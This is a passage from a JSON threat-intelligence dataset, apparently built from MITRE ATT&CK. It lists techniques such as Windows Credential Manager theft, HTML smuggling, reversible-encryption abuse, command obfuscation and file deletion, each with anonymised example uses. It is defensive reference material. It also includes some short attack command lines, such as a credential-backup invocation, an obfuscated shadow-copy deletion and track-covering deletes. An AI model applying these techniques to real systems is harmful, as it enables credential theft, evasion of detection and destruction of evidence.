      "can use a .NET compiled module named exchgrabber to enumerate credentials from the Credential Manager.",
      "has gathered credentials from the Windows Credential Manager tool.",
      "can obtain credentials from Vault files.",
      "has a plugin that can retrieve credentials from Internet Explorer and Microsoft Edge using `vaultcmd.exe` and another that can collect RDP access credentials using the `CredEnumerateW` function.",
      "can steal credentials by leveraging the Windows Vault mechanism.",
      "can use the QuarksPwDump tool to obtain local passwords and domain cached credentials.",
      "can gather Windows Vault credentials.",
      "contains functionality to acquire credentials from the Windows Credential Manager.",
      "can collect credentials from the Windows Credential Manager.",
      "contains a collection of Exfiltration modules that can harvest credentials from Windows vault credential objects.",
      "has used PowerShell cmdlet `Invoke-WCMDump` to enumerate Windows credentials in the Credential Manager in a compromised network.",
      "During   used a Windows Credential Manager stealer for credential access."
    ],
    "description": "Adversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).(Citation: Microsoft Credential Manager store)(Citation: Microsoft Credential Locker)The Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of [Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003), Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.Credential Lockers store credentials in encrypted `.vcrd` files, located under `%Systemdrive%\\Users\\\\[Username]\\AppData\\Local\\Microsoft\\\\[Vault/Credentials]\\`. The encryption key can be found in a file named Policy.vpol, typically located in the same folder as the credentials.(Citation: passcape Windows Vault)(Citation: Malwarebytes The Windows Vault)Adversaries may list credentials managed by the Windows Credential Manager through several mechanisms. vaultcmd.exe is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may also gather credentials by directly reading files located inside of the Credential Lockers. Windows APIs, such as CredEnumerateA, may also be absued to list credentials managed by the Credential Manager.(Citation: Microsoft CredEnumerate)(Citation: Delpy Mimikatz Crendential Manager)Adversaries may also obtain credentials from credential backups. Credential backups and restorations may be performed by running rundll32.exe keymgr.dll KRShowKeyMgr then selecting the Back up... button on the Stored User Names and Passwords GUI.Password recovery tools may also obtain plain text passwords from the Credential Manager.(Citation: Malwarebytes The Windows Vault)",
    "similar_words": [
      "Windows Credential Manager"
    ],
    "id": "T1555.004"
  },
  "attack-pattern--d456de47-a16f-4e46-8980-e67478a12dcb": {
    "name": "Server Software Component",
    "example_uses": [],
    "description": "Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications.(Citation: volexity_0day_sophos_FW)",
    "similar_words": [
      "Server Software Component"
    ],
    "id": "T1505"
  },
  "attack-pattern--d467bc38-284b-4a00-96ac-125f447799fc": {
    "name": "Non-Standard Encoding",
    "example_uses": [
      "can encode data with a NOT operation before sending the data to the control server.",
      "can use a custom hex byte swapping encoding scheme to obfuscate tasking traffic.",
      "has used a non-standard encoding in DNS tunneling removing any `=` from the result of base64 encoding and replacing `/` characters with `-s` and `+` characters with `-p`.",
      "can communicate with the C2 via subdomains that utilize base64 with character substitutions.",
      "can use a modified base32 encoding to encode data within the subdomain of C2 requests.",
      "can use a custom base62 and a de-facto base32 encoding that uses digits 0-9 and lowercase letters a-z in C2 communications.",
      "Newer variants of  will encode C2 communications with a custom system.",
      "encodes commands from the control server using a range of characters and gzip.",
      "has encoded data as readable Latin characters.",
      "can use a custom binary scheme to encode messages with specific commands and parameters to be executed.",
      "can encode C2 communications with a base64 algorithm using a custom alphabet.",
      "can use a modified Base64 encoding mechanism to send data to and from the C2 server.",
      "can use a custom Base64 alphabet for encoding C2.",
      "can use modified Base64 encoding to obfuscate communications."
    ],
    "description": "Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a non-standard data encoding system that diverges from existing protocol specifications. Non-standard data encoding schemes may be based on or related to standard data encoding schemes, such as a modified Base64 encoding for the message body of an HTTP request.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) ",
    "similar_words": [
      "Non-Standard Encoding"
    ],
    "id": "T1132.002"
  },
  "attack-pattern--d4b96d2c-1032-4b22-9235-2b5b649d0605": {
    "name": "Domain Controller Authentication",
    "example_uses": [
      "malware has altered the NTLM authentication program on domain controllers to allow  to login without a valid credential.",
      "is used to patch an enterprise domain controller authentication process with a backdoor password. It allows adversaries to bypass the standard authentication system to use a defined password for all accounts authenticating to that domain controller."
    ],
    "description": "Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts. Malware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any users account and/or credentials (ex: [Skeleton Key](https://attack.mitre.org/software/S0007)). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments.(Citation: Dell Skeleton)",
    "similar_words": [
      "Domain Controller Authentication"
    ],
    "id": "T1556.001"
  },
  "attack-pattern--d4bdbdea-eaec-4071-b4f9-5105e12ea4b6": {
    "name": "Transfer Data to Cloud Account",
    "example_uses": [
      "has used Megasync to exfiltrate data to the cloud.",
      "has used cloud storage to exfiltrate data in particular the megatools utilities were used to exfiltrate data to Mega a file storage service."
    ],
    "description": "Adversaries may exfiltrate data by transferring the data, including through sharing/syncing and creating backups of cloud environments, to another cloud account they control on the same service.A defender who is monitoring for large transfers to outside the cloud environment through normal file transfers or over command and control channels may not be watching for data transfers to another account within the same cloud provider. Such transfers may utilize existing cloud provider APIs and the internal address space of the cloud provider to blend into normal traffic or avoid data transfers over external network interfaces.(Citation: TLDRSec AWS Attacks)Adversaries may also use cloud-native mechanisms to share victim data with adversary-controlled cloud accounts, such as creating anonymous file sharing links or, in Azure, a shared access signature (SAS) URI.(Citation: Microsoft Azure Storage Shared Access Signature)Incidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts.(Citation: DOJ GRU Indictment Jul 2018) ",
    "similar_words": [
      "Transfer Data to Cloud Account"
    ],
    "id": "T1537"
  },
  "attack-pattern--d4dc46e3-5ba5-45b9-8204-010867cacfcb": {
    "name": "HTML Smuggling",
    "example_uses": [
      "has been delivered in ZIP files via HTML smuggling.",
      "has embedded an ISO file within an HTML attachment that contained JavaScript code to initiate malware execution.",
      "contains JavaScript code that can extract an encoded blob from its HTML body and write it to disk."
    ],
    "description": "Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign HTML files. HTML documents can store large binary objects known as JavaScript Blobs (immutable data that represents raw bytes) that can later be constructed into file-like objects. Data may also be stored in Data URLs, which enable embedding media type or MIME files inline of HTML documents. HTML5 also introduced a download attribute that may be used to initiate file downloads.(Citation: HTML Smuggling Menlo Security 2020)(Citation: Outlflank HTML Smuggling 2018)Adversaries may deliver payloads to victims that bypass security controls through HTML Smuggling by abusing JavaScript Blobs and/or HTML5 download attributes. Security controls such as web content filters may not identify smuggled malicious files inside of HTML/JS files, as the content may be based on typically benign MIME types such as text/plain and/or text/html. Malicious files or data can be obfuscated and hidden inside of HTML files through Data URLs and/or JavaScript Blobs and can be deobfuscated when they reach the victim (i.e. [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)), potentially bypassing content filters.For example, JavaScript Blobs can be abused to dynamically generate malicious files in the victim machine and may be dropped to disk by abusing JavaScript functions such as msSaveBlob.(Citation: HTML Smuggling Menlo Security 2020)(Citation: MSTIC NOBELIUM May 2021)(Citation: Outlflank HTML Smuggling 2018)(Citation: nccgroup Smuggling HTA 2017)",
    "similar_words": [
      "HTML Smuggling"
    ],
    "id": "T1027.006"
  },
  "attack-pattern--d50955c2-272d-4ac8-95da-10c29dda1c48": {
    "name": "Reversible Encryption",
    "example_uses": [],
    "description": "An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The AllowReversiblePasswordEncryption property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.(Citation: store_pwd_rev_enc)If the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components:1. Encrypted password (G$RADIUSCHAP) from the Active Directory user-structure userParameters2. 16 byte randomly-generated value (G$RADIUSCHAPKEY) also from userParameters3. Global LSA secret (G$MSRADIUSCHAPKEY)4. Static key hardcoded in the Remote Access Subauthentication DLL (RASSFM.DLL)With this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value.(Citation: how_pwd_rev_enc_1)(Citation: how_pwd_rev_enc_2)An adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory [PowerShell](https://attack.mitre.org/techniques/T1059/001) module. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to \"Windows Server 2008\" or higher.(Citation: dump_pwd_dcsync) In PowerShell, an adversary may make associated changes to user settings using commands similar to Set-ADUser -AllowReversiblePasswordEncryption $true.",
    "similar_words": [
      "Reversible Encryption"
    ],
    "id": "T1556.005"
  },
  "attack-pattern--d511a6f6-4a33-41d5-bc95-c343875d1377": {
    "name": "Command Obfuscation",
    "example_uses": [
      "has encoded PowerShell commands in Base64.",
      "PowerShell scripts can be encrypted with RC4 and compressed using Gzip.",
      "has used ROT13 encoding AES encryption and compression with the zlib library for their Python-based backdoor.",
      "has used Base64-encoded scripts.",
      "has `pyminifier` to obfuscate scripts.",
      "obfuscated scripts that were used on victim machines.",
      "obfuscated several scriptlets and code used on the victims machine including through use of XOR and RC4.",
      "has obfuscated various scripts.",
      "has the ability to obfuscate commands using Invoke-Obfuscation.",
      "can use Base64 and junk JavaScript code to obfuscate information.",
      "can use Base64-encoded scripts.",
      "has base64 encoded scripts to avoid detection.",
      "During  the threat actors ran encoded commands from the command line.",
      "has used encoded PowerShell commands.",
      "During  the threat actors used encoded PowerShell commands.",
      "malicious PowerShell commands can be encoded with base64.",
      "has encoded its PowerShell commands in Base64.",
      "has obfuscated scripts used in execution.",
      "has used the `Invoke-Obfuscation` framework to obfuscate their PowerShell.",
      "has used encryption and base64 to obfuscate its orchestrator code in the Registry.  has also used encoded PowerShell scripts.",
      "contains a collection of ScriptModification modules that compress and encode scripts and payloads.",
      "can use obfuscated and encoded scripts.",
      "has used base64-encoded commands.",
      "used Base64 encoding to obfuscate an  service and PowerShell commands.",
      "has used Daniel Bohannons Invoke-Obfuscation framework and obfuscated PowerShell scripts. The group has also used other obfuscation methods including Base64 obfuscation of VBScripts and PowerShell commands.",
      "has obfuscated a script with Crypto Obfuscator.",
      "PowerShell script has been obfuscated with multiple layers including base64 and hexadecimal encoding and XOR-encryption as well as obfuscated PowerShell functions and variables.",
      "has used Base64 to encode PowerShell commands.",
      "During  the threat actors executed an encoded VBScript file.",
      "has encoded PowerShell commands.",
      "has used environment variable string substitution for obfuscation.",
      "was likely obfuscated using `Invoke-Obfuscation`.",
      "droppers execute base64 encoded  commands.",
      "The PowerShell script with the  payload was obfuscated using the COMPRESS technique in `Invoke-Obfuscation`.",
      "has used environment variables and standard input (stdin) to obfuscate command-line arguments.  also obfuscates malicious macros delivered as payloads.",
      "has the ability to execute obfuscated commands on the infected host.",
      "During  the threat actors used Base64 to encode their PowerShell scripts.",
      "has used fragmented strings environment variables standard input (stdin) and native character-replacement functionalities to obfuscate commands.",
      "has used obfuscated variable names in a JavaScript configuration file.",
      "has obfuscated macros within malicious documents to hide the URLs hosting the malware CMD.exe arguments and PowerShell scripts.",
      "has used base64 encoding for scripts.",
      "executes and stores obfuscated Perl scripts.",
      "has used base64 encoded PowerShell commands.",
      "has used encryption (including salted 3DES via 's Out-EncryptedScript.ps1) random variable names and base64 encoding to obfuscate PowerShell commands and payloads.",
      "has used a character insertion obfuscation technique making the script appear to contain Chinese characters.",
      "has used base64 encoding and XOR to obfuscate PowerShell scripts.",
      "has used compressed and decimal encoded VBS scripts.",
      "has executed base64 encoded PowerShell scripts on compromised hosts.",
      "uses character replacement  environment variables and XOR encoding to obfuscate code. 's backdoor code is a multi-layer obfuscated encoded and compressed blob.   has used PowerShell code with custom string obfuscation",
      "obfuscates the macro commands in its initial payload.",
      "During  threat actors executed PowerShell commands which were encoded or compressed using Base64 zlib and XOR.",
      "has leveraged the BatchEncryption tool to perform advanced batch script obfuscation and encoding techniques.",
      "has obfuscated and randomized parts of the JScript code it is initiating.",
      "has used base64 encoding to obfuscate scripts on the system.",
      "has obfuscated scripts with the BatchEncryption tool.",
      "has used obfuscated or encrypted scripts.",
      "has obfuscated malicious scripts to help avoid detection.",
      "used Base64 to obfuscate executed commands.",
      "has used pyobfuscate zlib compression and base64 encoding for obfuscation.  has also used some visual obfuscation techniques by naming variables as combinations of letters to hinder analysis.",
      "has used Base64-encoded PowerShell scripts for post exploit activities on compromised hosts."
    ],
    "description": "Adversaries may obfuscate content during command execution to impede detection. Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze. This type of obfuscation can be included within commands executed by delivered payloads (e.g., [Phishing](https://attack.mitre.org/techniques/T1566) and [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)) or interactively via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).(Citation: Akamai JS)(Citation: Malware Monday VBE)For example, adversaries may abuse syntax that utilizes various symbols and escape characters (such as spacing,  `^`, `+`. `$`, and `%`) to make commands difficult to analyze while maintaining the same intended functionality.(Citation: RC PowerShell) Many languages support built-in obfuscation in the form of base64 or URL encoding.(Citation: Microsoft PowerShellB64) Adversaries may also manually implement command obfuscation via string splitting (`Wor+d.Application`), order and casing of characters (`rev <<<'dwssap/cte/ tac'`), globing (`mkdir -p '/tmp/:&$NiA'`), as well as various tricks involving passing strings through tokens/environment variables/input streams.(Citation: Bashfuscator Command Obfuscators)(Citation: FireEye Obfuscation June 2017)Adversaries may also use tricks such as directory traversals to obfuscate references to the binary being invoked by a command (`C:\\voi\\pcw\\..\\..\\Windows\\tei\\qs\\k\\..\\..\\..\\system32\\erool\\..\\wbem\\wg\\je\\..\\..\\wmic.exe shadowcopy delete`).(Citation: Twitter Richard WMIC)Tools such as Invoke-Obfuscation and Invoke-DOSfucation have also been used to obfuscate commands.(Citation: Invoke-DOSfuscation)(Citation: Invoke-Obfuscation)",
    "similar_words": [
      "Command Obfuscation"
    ],
    "id": "T1027.010"
  },
  "attack-pattern--d63a3fb8-9452-4e9d-a60a-54be68d5998c": {
    "name": "File Deletion",
    "example_uses": [
      "creates then deletes log files during installation of itself as a service.",
      "has a function to delete files.",
      "can remove files containing its payload after they are executed.",
      "has deleted malicious executables from compromised machines.",
      "has a command to delete files from the victims machine.",
      "can delete files and artifacts it creates.",
      "has used batch scripts and scheduled tasks to delete critical system files.",
      "can delete log files generated from the malware stored at C:\\windows\\temp\\tmp0207.",
      "has been seen deleting its own files and payloads to make analysis of the attack more difficult.",
      "has used been observed deleting scripts once used.",
      "A  macro deletes files after it has decoded and decompressed them.",
      "has the ability to delete folders and files from a targeted system.",
      "The  uploader or malware the uploader uses command to delete the RAR archives after they have been exfiltrated.",
      "deletes any temporary files it creates",
      "has deleted dropper files on an infected system using command scripts.",
      "has deleted the MSI file after installation.",
      "has the ability to uninstall malware from the infected host.",
      "has used a payload that removes itself after running.  also has deleted locally staged files for collecting credentials or scan results for local IP addresses after exfiltrating them.",
      "removes files from victim environments following use in multiple instances.",
      "has the ability to self delete.",
      "can delete files from victim machines.",
      "has been observed deleting its original launcher after installation.",
      "will delete its dropper and VBS scripts from the victims machine.",
      "During   removed all previously delivered files from a compromised computer.",
      "has used a utility called CLOSESHAVE that can securely delete a file from the system. They have also removed malware tools or other non-native files used during the intrusion to reduce their footprint or as part of the post-intrusion cleanup process.",
      "has the ability to uninstall itself by deleting its service and files.",
      "Recent versions of  delete files and registry keys created by the malware.",
      "marks files to be deleted upon the next system reboot and uninstalls and removes itself from the system.",
      "uses  to clean up the environment and attempt to prevent detection.",
      "can securely delete a file by hooking into the DeleteFileA and DeleteFileW functions in the Windows API.",
      "has been observed deleting the temporary files once they fulfill their task.",
      "contains a cleanup module that removes traces of itself from the victim.",
      "Once loaded into memory  deletes the keyword_parm.txt and parm.txt configuration files from disk.",
      "has deleted files and directories including XML and files successfully uploaded to C2 servers.",
      "removes all files in the /tmp directory.",
      "has a command to delete a file from the system.  deletes the app bundle and dropper after execution.",
      "has been observed deleting its original launcher after execution.",
      "Once a file is uploaded  will delete it from the machine.",
      "has the capability to delete local files.",
      "can delete specific files from a compromised host.",
      "can delete its dropper component from the targeted system.",
      "can delete files from the system.",
      "deletes one of its files 2.hwp from the endpoint after establishing persistence.",
      "is capable of deleting files on the victim. It also securely removes itself after collecting and exfiltrating data.",
      "deletes its payload along with the payload's parent process after it finishes copying files.",
      "has deleted files related to its dynamic debugger feature.",
      "deletes files using DeleteFileW API call.",
      "can delete files on the victims machine.",
      "can remove its log file from disk.",
      "installer/uninstaller component deletes itself if it encounters a version of Windows earlier than Windows XP or identifies security-related processes running.",
      "During  threat actors deleted `/tmp/test1.txt` on compromised Ivanti Connect Secure VPNs which was used to hold stolen configuration and cache files.",
      "can delete files it creates from the infected system.",
      "has deleted scripts after execution.",
      "has a command to delete a file from the machine.",
      "deletes data in a way that makes it unrecoverable.",
      "can delete files.",
      "has the ability to remove all files created during the dropper process.",
      "can use DeleteFileA to remove files from infected hosts.",
      "Following the successful injection of   deleted a temporary file it created named InventoryManager.bk after restoring the original SolarWinds Orion source code to the software library.",
      "The  trojan supports file deletion.",
      "can delete malware and associated artifacts from the victim.",
      "During  the threat actors used batch files that reduced their fingerprint on a compromised system by deleting malware-related files.",
      "deletes the original dropped file from the victim.",
      "can delete files indicated by the attacker and remove itself from disk using a batch file.",
      "has the capability to delete files and scripts from the victim's machine.",
      "uses an RPC server that contains a routine for file deletion and also removes itself from the system through a DLL export by deleting specific files.",
      "has a function to delete files from the victims machine.",
      "can delete files.",
      "can remove its persistence and delete itself.",
      "has a command to delete a file from the machine.",
      "can delete its configuration file after installation.",
      "has the ability to clean up installed files delete files and delete itself from the victims machine.",
      "has the ability to delete files from a compromised host.",
      "has deleted itself after creating a service as well as deleted a temporary file when the system reboots.",
      "is capable of deleting files.",
      "has deleted the exfiltrated data on disk after transmission.  has also used an instrumentor script to terminate browser processes running on an infected system and then delete the cookie files on disk.",
      "During the  vba_macro.exe deletes itself after `FONTCACHE.DAT` `rundll32.exe` and the associated .lnk file is delivered.",
      "can delete files and directories from targeted systems.",
      "has the ability to run cancel or closeanddeletestorage to remove all files from storage and delete the storage temp file on a compromised host.",
      "has deleted files associated with their payload after execution.",
      "can request to delete files.",
      "can delete files and directories.",
      "can use the command cmd.exe /c del to delete its artifacts from the system.",
      "has a command to delete files.",
      "has removed files from victim machines.",
      "deleted files from the system.",
      "has used malware to delete files after they are deployed on a compromised host.",
      "has used  to remove artifacts from victim networks.",
      "has used file deletion to remove some modules and configurations from an infected host after use.",
      "has intentionally deleted computer files to cover their tracks including with use of the program CCleaner.",
      "actors deleted tools and batch files from victim systems.",
      "has the ability to delete files and directories on compromised hosts.",
      "can delete files and folders from compromised machines.",
      "creates a backdoor through which remote attackers can delete files.",
      "can uninstall itself.",
      "has deleted files used during infection.",
      "has used plugins with a self-delete capability.",
      "has deleted itself from the system after execution.",
      "will delete files on the system.",
      "deletes its RAT installer file as it executes its DLL payload file.",
      "has the ability delete files from a compromised host.",
      "launches a script to delete their original decoy file to cover tracks.",
      "can delete tools from a compromised host after execution.",
      "can delete specified files.",
      "can delete files from the system.",
      "can securely delete files including deleting itself from the victim.",
      "is capable of deleting the backdoor file.",
      "has deleted itself and associated artifacts from victim machines.",
      "has deleted many of its files used during operations as part of cleanup including removing applications and deleting screenshots.",
      "can uninstall itself from compromised hosts as well create and modify directories delete move copy and rename files.",
      "has the ability to remove files and folders related to previous infections.",
      "can securely delete files by first writing random data to the file.",
      "can delete itself or specified files.",
      "will delete their tools and files and kill processes after their objectives are reached.",
      "has used backdoors that can delete files used in an attack from an infected system.",
      "can remove itself from a system.",
      "has a command to write random data across a file and delete it.",
      "deletes content from C2 communications that was saved to the user's temporary directory.",
      "has the ability to delete files.",
      "has deleted files it has created on a compromised host.",
      "can delete previously exfiltrated files from the compromised host.",
      "During  the threat actors consistently removed traces of their activity by first overwriting a file using `/c cd /d c:\\windows\\temp\\ & copy \\\\<IP ADDRESS>\\c$\\windows\\system32\\devmgr.dll \\\\<IP ADDRESS>\\c$\\windows\\temp\\LMAKSW.ps1 /y` and then deleting the overwritten file using `/c cd /d c:\\windows\\temp\\ & del \\\\<IP ADDRESS>\\c$\\windows\\temp\\LMAKSW.ps1`.",
      "can delete files from the system.",
      "has deleted and overwrote files to cover tracks.",
      "macOS backdoor can receive a delete command.",
      "has the capability of deleting local files.",
      "contains code to delete files from the victims machine.",
      "has attempted to complicate forensic analysis by deleting all the files contained in %APPDATA%\\..\\Local\\Temporary Internet Files\\Content.Word and %APPDATA%\\..\\Local Settings\\Temporary Internet Files\\Content.Word\\.",
      "can delete its executable from the AppData\\Local\\Temp directory on the compromised host.",
      "can delete .LNK files created in the Startup folder.",
      "can remove files from the compromised host.",
      "has commands to delete files and persistence mechanisms from the victim.",
      "can secure delete its DLL.",
      "deletes files to remove evidence on the machine.",
      "deleted the DLL dropper from the victims machine to cover their tracks.",
      "has the ability to delete files and directories.",
      "has the ability to delete itself from disk by creating a suspended notepad process and writing shellcode to delete a file into the suspended process using `NtWriteVirtualMemory`.",
      "uninstaller can delete registry entries files and folders and finally itself once these tasks have been completed.",
      "can delete files created on the victim's machine.",
      "can delete created files from a compromised system.",
      "has deleted tmp and prefetch files during post compromise cleanup activities.  has also deleted PowerShell scripts to evade detection on compromised machines.",
      "can delete files and directories.",
      "has deleted scripts and web shells to evade detection.",
      "has the ability to delete files on the compromised host.",
      "During the   routinely removed their tools including custom backdoors once remote access was achieved.",
      "deleted installation files after completion.",
      "has cleaned up all files associated with the secondary payload execution.",
      "can delete files to cover tracks.",
      "malware has deleted files in various ways including suicide scripts to delete malware binaries from the victim.  also uses secure file deletion to delete files from the victim.",
      "can delete the original executable after initial installation in addition to unused functions.",
      "has deleted itself and the 'index.dat' file on a compromised machine to remove recent Internet history from the system.",
      "has deleted data staged in tmp files after exfiltration.",
      "has a tool that can delete files.",
      "creates a backdoor through which remote attackers can delete files.",
      "can delete scripts from a subdirectory of /tmp after they are run.",
      "can uninstall its persistence mechanism and delete its configuration file.",
      "has the ability to delete its malware entirely from the target system.",
      "has the ability to delete PowerShell scripts from a compromised machine.",
      "will delete itself if a certain server response is received.",
      "has the capability to delete files.",
      "can uninstall itself including deleting its executable.",
      "can delete its configuration file from the targeted system.",
      "is capable of deleting files. It has been observed loading a Linux Kernel Module (LKM) and then deleting it from the hard disk as well as overwriting the data with null bytes.",
      "can remove files from a targeted system.",
      "has performed file deletion to evade detection.",
      "removes itself after execution and can delete files on the system.",
      "removed certain files and replaced them so they could not be retrieved.",
      "During the  campaign  routinely deleted tools logs and other files after they were finished with them.",
      "Malware used by  is capable of remotely deleting files from victims.",
      "has the capability to use rm -rf to remove folders and files from the victim's machine.",
      "has deleted its files and components from a compromised host.",
      "has a command to delete a specified file.",
      "has deleted the initial dropper after running through the environment checks.",
      "is capable of launching a remote shell on the host to delete itself.",
      "can delete files downloaded to the compromised host.",
      "has the capability to to delete files.",
      "deletes its original installer file once installation is complete.",
      "can delete the DLLs for its various components from a compromised host.",
      "can issue SOAP requests to delete already processed C2 emails.  can also delete itself from the infected system.",
      "is capable of file deletion along with other file system interaction.",
      "has a module to delete itself from the infected machine.",
      "has a command to delete its Registry key and scheduled task.",
      "has a command to delete a file. It also can uninstall scripts and delete files to cover its track.",
      "has quickly deleted `cbd.exe` from a compromised host following the successful deployment of their malware.",
      "can delete its DLL file and related files by Registry value.",
      "tools can delete files used during an operation.",
      "After encrypting its own log files the log encryption module in  deletes the original unencrypted files from the host.",
      "had a command to delete files.",
      "backdoor deletes files after they have been successfully uploaded to C2 servers.",
      "can delete its loader using a batch file in the Windows temporary folder.",
      "can delete all files on the C:\\ D:\\ E:\\ and F:\\ drives using  Remove-Item commands.",
      "has deleted collected items after uploading the content to its C2 server.",
      "has run `rd /S` to delete their working directories and files.",
      "has a command to delete files and directories.",
      "can delete itself following the successful execution of a follow-on payload.",
      "creates a backdoor through which remote attackers can delete files.",
      "has the ability to quit and delete itself.",
      "can delete files that may interfere with it executing. It also can delete temporary files and itself after the initial script executes.",
      "can delete files written to disk.",
      "can delete files from a compromised host.",
      "has deleted artifacts including scheduled tasks communicates files from the C2 and other logs.",
      "has a command to delete a file.",
      "can delete files from a compromised host after they are exfiltrated.",
      "can delete a specified file.",
      "has the ability to overwrite its own file with random bites.",
      "has a command to delete files.",
      "has deleted the filepath %APPDATA%\\Intel\\devmonsrv.exe.",
      "has the ability to receive and execute a self-delete command.",
      "can delete files from a compromised host.",
      "s plugin deletes the collected files and log files after exfiltration.",
      "can self delete its dropper after the malware is successfully deployed.",
      "will delete its dropped files after bypassing UAC.",
      "can be used to delete files from the file system.",
      "has the ability to delete a specified file.",
      "can delete files via `C:\\Windows\\system32\\cmd.exe /c ping 1.1.1.1 -n 1 -w 3000 > Nul & rmdir /s /q`.",
      "has deleted files on infected machines.",
      "has the capability to delete files off the victims machine.",
      "can delete old binaries on a compromised host.",
      "Some  samples use cmd.exe to delete temporary files.",
      "will remove all created artifacts such as dropped executables.",
      "has several commands to delete files associated with the malware from the victim.",
      "can mark its binary code for deletion after reboot.",
      "has the ability to delete files.",
      "has deleted existing logs and exfiltrated file archives from a victim.",
      "has the ability to delete downloaded files from a compromised host.",
      "The  dropper can delete itself from the victim. Another  variant has the capability to delete specified files.",
      "will delete the folder containing malicious scripts if it detects the hostname as `PIS-APP` `PIS-MOB` `WSUSPROXY` or `PIS-DB`.",
      "has the ability to overwrite scripts and delete itself if a sandbox environment is detected.",
      "can run a `Clear Agents Track` command on an infected machine to delete -related logs.",
      "can uninstall its loader through the use of a `Sdl` command.",
      "has used scripts to delete itself after execution.",
      "can execute batch scripts to delete files.",
      "can self delete to cover its tracks.",
      "can delete downloaded executables after running them.",
      "has deleted files using the VBA kill function.",
      "contains the deletFileFromPath function to delete a specified file using the NSFileManager:removeFileAtPath method.",
      "can delete files off the system.",
      "can run a batch script named `del.bat` to remove any  payload-linked files from a compromise system if anti-analysis or locale checks fail.",
      "can delete itself from the compromised computer.",
      "has the ability to delete files from a compromised host.",
      "can delete files and itself after infection to avoid analysis.",
      "deletes the .LNK file from the startup directory as well as the dropper components.",
      "can delete files including its dropper component.",
      "has deleted batch files after execution.",
      "can delete all files created during its execution.",
      "can delete folders and files including overwriting its executable with legitimate programs.",
      "can use embedded scripts to remove itself from the infected host.",
      "has used tools including  to remove malicious files from compromised hosts.",
      "deletes files related to lateral movement to avoid detection.",
      "deleted various artifacts from victim systems following use.",
      "has the ability to delete itself.",
      "can self-delete from a compromised host if safety checks of C2 connectivity fail.",
      "has the ability to uninstall the  driver and delete the `rwdsk` file on disk.",
      "deleted files related to initial installation such as temporary files related to the PID of the main web process.",
      "uses a batch file remover.bat to delete malware artifacts and the batch file itself during execution.",
      "After initial setup 's original execution process deletes the dropped binary and exits.",
      "removes on-disk copies of tools and other artifacts after it the primary botnet payload has been loaded into memory on the victim device.",
      "can delete the previously used staging directory and files on subsequent rounds of exfiltration and replace it with a new one.",
      "can remove files related to use and installation.",
      "has run `rd /S` to delete their working directories and deleted systeminfo.dat from `C:\\Users\\Public\\Documentsfiles`.",
      "can delete its initial delivery script from disk during execution.",
      "has uninstalled tools from compromised endpoints after use.",
      "can self-delete.",
      "has deleted files after execution.",
      "can delete itself when given the appropriate command.",
      "writes batch scripts to disk such as system.bat and remover.bat that perform various anti-analysis and anti-forensic tasks before finally deleting themselves at the end of execution.  attempts to delete itself after encryption or wiping operations are complete and before shutting down the victim machine.",
      "has the ability to self-delete.",
      "can delete files on victim systems including itself.",
      "can self-delete its executable file from the compromised system.",
      "deleted ransomware executables post-encryption.",
      "has deleted its staging directories.",
      "can delete itself from disk.",
      "can delete malicious executables from compromised machines.",
      "has a function to remove artifacts.",
      "removes `bootstrap.min.css` after parsing command and control instructions restoring the file to its original state.",
      "has the ability to delete staged files after they are uploaded to C2.",
      "included multiple instances of file deletion or removal during execution and other adversary actions.",
      "can remove files on victim systems.",
      "can delete itself from disk after execution.",
      "can delete payloads and files used to pass C2 commands from remotely hosted cloud accounts.",
      "deletes itself following device encryption.",
      "will self-delete if a hard-coded configuration file is not found.",
      "creates and can execute a BAT script that will delete the malware.",
      "removes its initial ZIP delivery archive after processing the enclosed LUA script.",
      "can delete itself depending on various checks performed during execution.",
      "includes a self-delete function where the malware deletes itself from disk after execution and program load into memory.",
      "deletes its original executable and terminates its original process after creating a systemd service."
    ],
    "description": "Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well.(Citation: Microsoft SDelete July 2016) Examples of built-in [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) functions include del on Windows, rm or unlink on Linux and macOS, and `rm` on ESXi.",
    "similar_words": [
      "File Deletion"
    ],
    "id": "T1070.004"
  },
